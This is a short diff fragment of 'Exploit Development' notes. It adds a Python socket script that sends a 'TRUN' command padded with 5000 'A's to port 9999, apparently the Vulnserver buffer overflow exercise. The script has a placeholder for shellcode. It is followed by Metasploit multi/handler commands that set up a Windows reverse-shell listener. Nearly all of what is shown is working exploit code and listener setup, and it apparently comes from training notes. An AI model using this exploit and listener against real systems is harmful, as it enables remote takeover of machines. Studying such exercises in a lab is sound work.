@@ -223,11 +223,21 @@ Exploit Development
 
 
 
+SCRIPT TO SEND AN EXPLOIT
+
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 5000
+####ADD THE SHELLCODE PORTION
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("", 9999))
+print(s.recv(1024))
+s.send(buf)
+s.close()
 
 
-
-
-
+MSFCONSOLE COMMANDS TO LISTEN FOR THE EXPLOIT WE SENT
 
 msf6 > use multi/handler
 msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
